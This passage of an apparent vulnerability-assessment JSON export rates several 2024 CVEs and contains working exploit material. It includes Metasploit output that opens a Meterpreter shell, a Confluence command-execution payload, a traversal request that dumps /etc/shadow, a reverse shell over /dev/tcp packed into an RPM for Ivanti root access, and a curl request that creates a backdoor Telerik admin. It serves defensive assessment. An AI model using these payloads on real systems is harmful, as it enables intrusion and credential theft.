host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\r\n   SRVPORT    8080             yes       The local port to listen on.\r\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\r\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\r\n   TARGETURI  /                yes       The URI of the NorthStar C2 Application\r\n   URIPATH    /                no        The URI to use for this exploit (default is random)\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/windows/http/x64/meterpreter/reverse_tcp):\r\n\r\n   Name                Current Setting  Required  Description\r\n   ----                ---------------  --------  -----------\r\n   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)\r\n   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)\r\n   FETCH_DELETE        false            yes       Attempt to delete the binary after execution\r\n   FETCH_FILENAME      KNBXoiAeeq       no        Name to use on remote system when storing payload; cannot contain spaces or slashes\r\n   FETCH_SRVHOST       172.16.199.1     no        Local IP to use for serving payload\r\n   FETCH_SRVPORT       9090             yes       Local port to use for serving payload\r\n   FETCH_URIPATH                        no        Local URI to use for serving payload\r\n   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.\r\n   LHOST               172.16.199.1     yes       The listen address (an interface may be specified)\r\n   LPORT               4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic Target\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) > run\r\n[*] Exploit running as background job 2.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[!] The service is running, but could not be validated. NorthStar Login page detected\r\n[*] Using URL: http://172.16.199.1:8080/\r\n[*] Server started.\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) > [*] Waiting on XSS execution\r\n[+] 172.16.199.131   northstar_c2_xss_to_agent_rce - Received cookie: d89vrb0v20fpr9mr9v63t6ag4j\r\n[+] 172.16.199.131   northstar_c2_xss_to_agent_rce - Live Agents\r\n===========\r\n\r\n ID                   IP              OS                     Username                 Hostname         Status\r\n --                   --              --                     --------                 --------         ------\r\n NcXSkaPsdYYqgc3m1Wq  172.16.199.137  Windows 10 Enterprise  DESKTOP-N3ORU31\\msfuser  DESKTOP-N3ORU31  Online\r\n\r\n[*] 172.16.199.131   northstar_c2_xss_to_agent_rce - (NcXSkaPsdYYqgc3m1Wq) Stealing DESKTOP-N3ORU31\r\n[*] Sending stage (201798 bytes) to 172.16.199.137\r\n[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.137:50597) at 2024-05-13 14:25:50 -0700\r\n\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) > sessions -i 1\r\n[*] Starting interaction with 1...\r\n\r\nmeterpreter > getuid\r\nServer username: DESKTOP-N3ORU31\\msfuser\r\nmeterpreter > sysinfo\r\nComputer        : DESKTOP-N3ORU31\r\nOS              : Windows 10 (10.0 Build 19045).\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nDomain          : WORKGROUP\r\nLogged On Users : 2\r\nMeterpreter     : x64/windows\r\nmeterpreter >\r\n```\r\n\r\n# Attacker Value and Exploitability\r\n\r\nThis requires an admin user interaction in order for the exploit to be successful, which is why the attacker value is lower. Also you don't know what target you're going to get a session on before the exploit is successful because you're unable to see what agents are connected to the C2 up until you steal the admin cookie, which also makes this slightly less appealing. Although that being said it's pretty cool such a solid and reliable exploit was found in a C2 used by real APTs.\r\n\r\n# References\r\nhttps://blog.chebuya.com/posts/discovering-cve-2024-28741-remote-code-execution-on-northstar-c2-agents-via-pre-auth-stored-xss/#fn:2",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "5ad314a1-9fd7-47d7-835f-f29680b3961d",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "03c38025-45aa-42fd-81cf-1d717e8ba8d7",
      "created": "2024-05-28T21:20:56.756545Z",
      "revisionDate": "2024-07-30T17:14:29.806645Z",
      "document": "This vulnerability can be leveraged by an authenticated attacker to execute OS commands within the context of the Confluence application server. The authenticated user must have the \"Confluence Administrator\" global permission. By default, this permission is only granted to the `confluence-administrators` group.\r\n\r\nTo leverage this vulnerability, the user would login to Confluence, then:\r\n\r\n1. Navigate to General Configuration > Configure Code Macro\r\n1. Select \"Add a new language\"\r\n1. Provide a javascript file to execute, using `java.lang.ProcessBuilder` to run an arbitrary command\r\n1. Specify an arbitrary language name\r\n1. Press the \"Add\" button\r\n\r\nOnce the \"Add\" button is pressed, there will likely be an error message displayed in the UI stating that the uploaded language file is invalid. Despite this error message, the Javascript code is executed. The language fails to be added so there is no language to clean up.\r\n\r\n**exploit.js**\r\nThe following exploit.js source file will echo the current user information to `/tmp/output`.\r\n```\r\nnew java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/usr/bin/sh\", \"-c\", \"echo $(id) > /tmp/output\"]).start()\r\n```\r\n\r\nOriginal source from: https://github.com/W01fh4cker/CVE-2024-21683-RCE/blob/main/exploit.js\r\n",
      "score": 4,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "1b3e554c-47a1-40f1-a09a-ea867bb4f8a4",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "b945590f-46f3-47c5-b1d3-f391465110e0",
      "created": "2024-05-30T17:07:18.268994Z",
      "revisionDate": "2024-06-12T07:43:08.527442Z",
      "document": "On May 28, 2024, Check Point published an advisory for an unauthenticated information disclosure vulnerability affecting Check Point Security Gateway devices configured with either the \u201cIPSec VPN\u201d or \u201cMobile Access\u201d software blade. This vulnerability was stated as being a vulnerability impacting devices with password-only authentication enabled on some accounts. However, upon analysis, CVE-2024-24919 was discovered to be an unauthenticated arbitrary file read as root. Though attackers may steal credential files to crack account password hashes, CVE-2024-24919 also impacts systems that are not configured for password-only authentication.\r\n\r\nThis vulnerability should be urgently addressed by anyone running a Check Point Security Gateway with the IPSec VPN or Mobile Access blades enabled. Additionally, organizations should reference the [Rapid7 blog post](https://www.rapid7.com/blog/post/2024/05/30/etr-cve-2024-24919-check-point-security-gateway-information-disclosure/) for this vulnerability for remediation and detection recommendations. As of May 30, 2024, CVE-2024-24919 has been added to CISA's [KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) catalog.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "ad36fea3-37bf-43b3-a5d3-1e4715d23ecb",
      "editorId": "4a5ca587-a819-49f8-91eb-07b9c2a708fe",
      "topicId": "b945590f-46f3-47c5-b1d3-f391465110e0",
      "created": "2024-05-30T21:44:32.388871Z",
      "revisionDate": "2024-06-12T07:43:09.354722Z",
      "document": "This is trivial to exploit. The vulnerability at its core is a directory traversal vulnerability that allows for full access to files on the Check Point VPN device/service. It also appears that this an unauthenticated vulnerability and given that these servers will by their very nature be publicly exposed, significantly increases the risk of this vulnerability.\r\n\r\n## Exploit\r\nThe exploit itself, as mentioned above is trivial to exploit. An example is shown on [https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/](https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/):\r\n\r\n### Request\r\n```\r\nPOST /clients/MyCRL HTTP/1.1\r\nHost: <redacted>\r\nContent-Length: 39\r\n\r\naCSHELL/../../../../../../../etc/shadow\r\n```\r\n\r\n### Response\r\n```\r\nHTTP/1.0 200 OK\r\nDate: Thu, 30 May 2024 01:38:29 GMT\r\nServer: Check Point SVN foundation\r\nContent-Type: text/html\r\nX-UA-Compatible: IE=EmulateIE7\r\nConnection: close\r\nX-Frame-Options: SAMEORIGIN\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nContent-Length: 505\r\n\r\nadmin:$6$rounds=10000$N2We3dls$xVq34E9omWI6CJfTXf.4tO51T8Y1zy2K9MzJ9zv.jOjD9wNxG7TBlQ65j992Ovs.jDo1V9zmPzbct5PiR5aJm0:19872:0:99999:8:::\r\nmonitor:*:19872:0:99999:8:::\r\nroot:*:19872:0:99999:7:::\r\nnobody:*:19872:0:99999:7:::\r\npostfix:*:19872:0:99999:7:::\r\nrpm:!!:19872:0:99999:7:::\r\nshutdown:*:19872:0:99999:7:::\r\npcap:!!:19872:0:99999:7:::\r\nhalt:*:19872:0:99999:7:::\r\ncp_postgres:*:19872:0:99999:7:::\r\ncpep_user:*:19872:0:99999:7:::\r\nvcsa:!!:19872:0:99999:7:::\r\n_nonlocl:*:19872:0:99999:7:::\r\nsshd:*:19872:0:99999:7:::\r\n```\r\n\r\nUsing this, an attacker would be able to gain access to sensitive data on the server, such as the configuration for the VPN service.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "8e941ab8-690f-4125-b598-9a8ff7d935f0",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "b05620a8-15ae-4b38-9311-8081500d2630",
      "created": "2024-06-03T18:32:44.391433Z",
      "revisionDate": "2024-06-05T15:09:11.912937Z",
      "document": "Ivanti EPMM (previously known as MobileIron Core) is vulnerable to a local privilege escalation vulnerability. The `install` command accessible from the `MobileIron CORE CLI` or `Ivanti EPMM CLI` allows privileged CLI users to install .rpm packages. Affected versions are versions prior to `12.1.0.0`, `12.0.0.0`, and `11.12.0.1`.\r\n\r\nThe `install` command fails to enforce signature verification or URL filtering of any sort when installing rpm from url allowing an attacker to host a malicious rpm package and have their victim download and install it with root privileges. \r\n\r\nThere exists an `install` binary on the on the affected appliance - please note that it is unrelated to the `install` command accessible from the CLI which is vulnerable to the priv esc:\r\n```\r\nwhich install\r\n/bin/install\r\ninstall --help\r\nUsage: install [OPTION]... [-T] SOURCE DEST\r\n  or:  install [OPTION]... SOURCE... DIRECTORY\r\n  or:  install [OPTION]... -t DIRECTORY SOURCE...\r\n  or:  install [OPTION]... -d DIRECTORY...\r\n\r\nThis install program copies files (often just compiled) into destination\r\nlocations you choose.  If you want to download and install a ready-to-use\r\npackage on a GNU/Linux system, you should instead be using a package manager\r\nlike yum(1) or apt-get(1).\r\n```\r\n\r\nTo access the vulnerable command, one must first gain CLI access via SSH or physical access\r\n```\r\n\u279c ssh msfuser@172.16.199.40\r\nmsfuser@172.16.199.40's password:\r\nLast login: Mon Jun  3 14:12:12 2024 from 172.16.199.1\r\n************************************************************\r\n*                   MobileIron CORE CLI                    *\r\n*                                                          *\r\n*                                                          *\r\n************************************************************\r\nWelcome msfuser it is Mon Jun 3 15:00:14 UTC 2024\r\nCORE(11.2.0.0-31)@lobster.example.com>\r\n\r\n  enable      Turn on privileged commands\r\n  exit        Exit from the EXEC\r\n  help        Description of the interactive help system\r\n  host        Query Internet name servers\r\n  logout      Exit from the EXEC\r\n  ping        Send echo messages\r\n  show        Show running system information\r\n  speedtest   Performs speed test for disk memory and cpu\r\n  timeout     CLI Idle timeout.\r\n  traceroute  Trace route to destination\r\n```\r\n\r\nThen turn on privileged commands with `enable` followed by the correct Admin CLI password:\r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com> enable\r\nPassword:\r\nCORE(11.2.0.0-31)@lobster.example.com#install\r\n\r\n  rpm  Gets the rpm and install. choose any from: cdrom file info url\r\n\r\nCORE(11.2.0.0-31)@lobster.example.com#install rpm\r\n\r\n  cdrom  Gets the rpm and install from cdrom\r\n  file   Get and show the rpm(s) from the given file path and installs\r\n  info   Gets list of rpms installed\r\n  url    Gets the rpm and install from the given url\r\n\r\n```\r\n\r\nAs outlined by securekomodo in the following [blog post](https://www.redlinecybersecurity.com/blog/exploiting-cve-2024-22026-rooting-ivanti-epmm-mobileiron-core) the CLI command `install` is really just a wrapper for the command: \r\n```\r\n/bin/rpm -Uvh *.rpm\r\n```\r\nWhich will get run as root, allowing an attacker to host a malicious RPM package, install it and successfully escalate privileges.\r\n# Example PoC \r\n\r\nCreate a `postinstall.sh` script that will run as root after the .rpm package gets installed. Include your payload. \r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ cat postinstall.sh\r\n#!/bin/sh\r\nbash -i >& /dev/tcp/172.16.199.131/443 0>&1\r\nexit 0\r\n```\r\n\r\nCreate the malicious .rpm package using the Ruby gem `fpm`:\r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ fpm -s dir -t rpm -n test-poc -v 2.0 -a i386 --description \"MobileIron Reverse Shell\" --maintainer \"msfuser\" --after-install postinstall.sh -C .\r\nCreated package {:path=>\"test-poc-2.0-1.i386.rpm\"}\r\n```\r\n\r\nHost the .rpm package via a Python HTTP server:\r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ sudo python3 -m http.server 80\r\n[sudo] password for msfuser:\r\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\r\n```\r\n\r\nStart a `nc` listener on our attacking machine:\r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ sudo nc -l 443\r\n[sudo] password for msfuser:\r\n```\r\n\r\nAs previously demonstrated SSH to the vulnerable appliance or physically access theMobile Iron Core / Ivanti EPMM CLI and type `enable` followed by the Admin password in order to enable privileged commands. Once successfully authenticated use the vulnerable command to download and install the .rpm in the context of the root user. \r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com#install rpm url http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\n--2024-06-03 16:04:48--  http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\nConnecting to 172.16.199.131:80... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 49796 (49K) [application/x-redhat-package-manager]\r\nSaving to: 'test-poc-2.0-1.i386.rpm'\r\n\r\n100%[====================================================================================================================================================================================================================>] 49,796      --.-K/s   in 0.001s\r\n\r\n2024-06-03 16:04:48 (32.7 MB/s) - 'test-poc-2.0-1.i386.rpm' saved [49796/49796]\r\n\r\nPreparing...                          ################################# [100%]\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n100   469  100   469    0     0   279k      0 --:--:-- --:--:-- --:--:--  458k\r\nUpdating / installing...\r\n   1:test-poc-2.0-1                   ################################# [100%]\r\n```\r\n\r\nCheck the `nc` listener and see that we've received a shell running in the context of the root user. \r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ sudo nc -l 443\r\n[sudo] password for msfuser:\r\n[root@lobster.example.com 2024-06-03--16-30-57 / #] id\r\nid\r\nuid=0(root) gid=0(root) groups=0(root)\r\n[root@lobster.example.com 2024-06-03--16-42-52 / #] uname -a\r\nuname -a\r\nLinux lobster.example.com 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\r\n```\r\n\r\nTo reset the target in order to retest, simply remove the package you just installed with: \r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com#no install rpm test-poc-2.0-1.i386\r\nUninstalled  ivanti-privesc-13.37-1.i386 successfully.\r\n```\r\n# IoCs\r\n\r\nUnprivileged users can query logs from the Mobile Iron / Ivanti EPMM CLI. One way users can check for IoCs in by issuing the following command:\r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com> show log messages\r\n--log 'messages' --\r\n```\r\n\r\nThe above command will allow the user to access `/var/log/messages` via the CLI. The below isn't indicative of a successful exploit attempt, the following log lines will be present on a device where the user has installed malicious or trusted RPM packages using the CLI. \r\n```\r\nJun  3 16:51:51 lobster installTools: Command: /bin/rpm -Uvh *.rpm successful\r\nJun  3 16:51:51 lobster installTools: Command: /bin/ls *.rpm  >> /mi/files/installedTools successful\r\nJun  3 16:51:52 lobster installTools: Command: /bin/rm * >& /dev/null successful\r\nJun  3 16:51:52 lobster installTools: Command: popd >& /dev/null successful\r\nJun  3 16:51:52 lobster installTools: RPM downloaded and installed successfully\r\n```\r\n\r\nInterestingly enough, it doesn't seem this command completes successfully, despite it saying that it does.  There is no reference to our malicious .rpm file in the file `/mi/files/installedTools`\r\n```\r\nJun  3 16:51:51 lobster installTools: Command: /bin/ls *.rpm  >> /mi/files/installedTools successful\r\n```\r\nIt gets created but is zero bytes:\r\n```\r\n[root@lobster.example.com 2024-06-03--17-31-48 files #] ls -l /mi/files/installedTools\r\nls -l /mi/files/installedTools\r\n-rw-r--r-- 1 root root 0 Jun  3 17:27 /mi/files/installedTools\r\n```\r\n\r\nAlso one can look at the current processes for tell tale signs of successful exploitation by running:\r\n```\r\n[root@lobster.example.com 2024-06-03--17-35-43 files #] ps aux\r\nps aux\r\nUSER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\n...\r\nroot      63342  0.0  0.0 137500  5536 pts/0    S    17:27   0:00 /usr/bin/sudo /mi/bin/installTools url http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\nroot      63345  0.0  0.0   9700  1584 pts/0    S    17:27   0:00 /bin/bash /mi/bin/installTools url http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\nroot      63407  0.0  0.1  78976 10308 pts/0    S    17:27   0:00 /bin/rpm -Uvh test-poc-2.0-1.i386.rpm\r\nroot      63408  0.0  0.0   9564  1124 pts/0    S    17:27   0:00 /bin/sh /var/tmp/rpm-tmp.D6MXUG 1\r\nroot      63409  0.0  0.0 116004  2684 pts/0    S    17:27   0:00 bash -i\r\n```\r\n\r\nWe can see that processes that were spawned in order to download and install our malicious rpm are still running. \r\nIf we get the PID from the reverse shell we confirm `63409` in the above is our reverse shell and the sink of our exploit.\r\n```\r\n[root@lobster.example.com 2024-06-03--17-37-12 files #] echo \"My PID is $$\"\r\necho \"My PID is $$\"\r\nMy PID is 63409\r\n```\r\n\r\nIf we run the following we can get a bit more detail of the context of the root process spawned when this is exploited:\r\n```\r\n[root@lobster.example.com 2024-06-03--17-58-29 var #] ps auxe | grep 63409\r\nps auxe | grep 63409\r\nroot      63409  0.0  0.0 116004  2704 pts/0    S    17:27   0:00 bash -i XDG_SESSION_ID=2903 MI_DATE_FORMAT=%Y-%m-%d--%H-%M-%S TERM=xterm-256color SHELL=/bin/bash MI_DATE_COMMAND=date +%Y-%m-%d--%H-%M-%S USER=root SUDO_USER=msfuser SUDO_UID=2002 USERNAME=root RPM_INSTALL_PREFIX0=/ MAIL=/var/mail/root PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin _=/bin/bash PWD=/ JAVA_HOME=/usr/java/default HOME=/root SUDO_COMMAND=/mi/bin/installTools url http://172.16.199.131/test-poc-2.0-1.i386.rpm SHLVL=2 RPM_INSTALL_PREFIX=/ LOGNAME=root SUDO_GID=1001\r\n\r\n```\r\n\r\n\r\n# Attacker Value and Exploitability Rating\r\n\r\nI gave this vulnerability an attacker rating of 1/5 mainly due to the fact authentication to the CLI is required as well as the CLI Admin password in order to enable privileged commands to access the vulnerable command `install`. \r\n\r\nOnce the necessary credentials are obtained exploitation is straightforward: host the malicious package for the victim to download and install, then profit. However the need for such high credentials makes this vulnerability difficult to exploit in the real world.\r\n\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "20d30f34-ff47-402d-9991-678b34b3fbb4",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "b3be8a7a-b4bf-47ac-842a-d2367cf3c3d5",
      "created": "2024-06-03T18:57:19.331193Z",
      "revisionDate": "2024-06-05T15:09:08.867535Z",
      "document": "So far, 2024 has seen a few notable vulnerabilities, such as [CVE-2024-1709](https://www.rapid7.com/blog/post/2024/02/20/etr-high-risk-vulnerabilities-in-connectwise-screenconnect/), that attack setup wizard flows for authentication bypass. This vulnerability, [discovered by researcher Sina Kheirkhah](https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/), falls into the same group. By exploiting an access control vulnerability in the administrator setup wizard, unauthenticated attackers gain high-privileged access to Telerik Report Server. With the newly-acquired administrator account, another new Report Server vulnerability, tracked as [CVE-2024-1800](https://attackerkb.com/topics/VcIY8WcbW3/cve-2024-1800), can be leveraged for remote code execution on the host system. \r\n\r\n### Exploitation\r\nThe initial administrator setup code in `Telerik.ReportServer.Web.dll!Telerik.ReportServer.Web.Controllers.StartupController.Register` does not check if setup has already been completed. As a result, the attacker can manually perform the web request to create a new administrator account. Per Sina's public [proof of concept](https://raw.githubusercontent.com/sinsinology/CVE-2024-4358/main/CVE-2024-4358.py), the authentication bypass vulnerability can be exploited with a single request:\r\n`curl 'http://TARGET_HERE/Startup/Register' -d 'Username=USERNAME_HERE&Password=PASSWORD_HERE&ConfirmPassword=PASSWORD_HERE&Email=backdoor%40admin.com&FirstName=backdoor&LastName=user'`\r\n\r\n\r\n### Public Exposure\r\nIt's worth mentioning that Shodan only appears to return a few hundred public-facing Telerik Report Server instances. However,  due to the unauthenticated RCE impact, organizations running the Report Server would be wise to patch with urgency. The [Progress Knowledge Base](https://docs.telerik.com/report-server/knowledge-base/registration-auth-bypass-cve-2024-4358) contains guidance on how to remediate this vulnerability.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f5c5359d-2446-4e33-a1a2-6a66aa2fb5f6",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "e086b557-32ad-40fa-bc15-654924fa1321",
      "created": "2024-06-06T16:59:46.379069Z",
      "revisionDate": "2024-06-10T07:58:44.365903Z",
      "document": "The Rejetto HTTP File Server (HFS) version 2.x is vulnerable to an unauthenticated server side template injection (SSTI) vulnerability. A remote unauthenticated attacker can execute code with the privileges of the user account running the `HFS.exe` server process. The vulnerability has been confirmed to work against version `2.4.0 RC7` and `2.3m`. The Rejetto HTTP File Server (HFS) version 2.x is no longer supported by the maintainers and no patch is available. Users are recommended to upgrade to version 3.x.\r\n\r\nThe server uses a [default template](https://github.com/rejetto/hfs2/blob/v2.4-rc07/default.tpl) when rendering the content for a HTTP response. This template when rendered will include the content of a request\u2019s `search` query parameter. It is this `search` query parameter that lets us supply a value that will not be escaped correctly, and ultimately results in an SSTI vulnerability.\r\n\r\nUnder normal operation any user supplied content will be escaped, so any symbols, which are normally encoded as `%symbol-name%`, and any macros, which are normally encoded as `{:macro-name:}` will be escaped to prevent SSTI.\r\n\r\nHowever we can force a percent symbol to become un-escaped. This allows us to embed any symbol in the content being processed. We can do this via the sequence `%25x%25symbol-name%25`.\r\n\r\nWe can leverage this to force the [`%url%`](https://github.com/rejetto/hfs2/blob/v2.4-rc07/scriptLib.pas#L1709) symbol to become unescaped. When the `%url%` symbol is processed by the server, it will echo back the remainder of the URL into the server side content. By forcing the remainder of the URL in the HTTP request to not be correctly URL-encoded, we can now include characters such as additional  `%` or `}` characters. \r\n\r\nTo inject arbitrary macros, we first need to close the default template [`MARKER_QUOTE`](https://github.com/rejetto/hfs2/blob/master/parserLib.pas#L16) sequence (`{:`) by writing an unexpected `MARKER_UNQUOTE` (`:}`) sequence, however this will still be filtered. To bypass this filtering, we can leverage the [`%host%`](https://github.com/rejetto/hfs2/blob/v2.4-rc07/scriptLib.pas#L1701) symbol and an empty host header value. So `:%host%}` will become `:}` and this will not be escaped. After this happens we can perform an arbitrary template injection containing a sequence of any HFS symbols or macros we want.\r\n\r\nFinally we can execute an arbitrary operating system command by using the [`exec`](https://github.com/rejetto/hfs2/blob/v2.4-rc07/scriptLib.pas#L2313) macro as shown below. As the `search` query parameter is processed several times by the default template, we avoid executing our command several times by issuing a [`break`](https://github.com/rejetto/hfs2/blob/v2.4-rc07/scriptLib.pas#L2038) 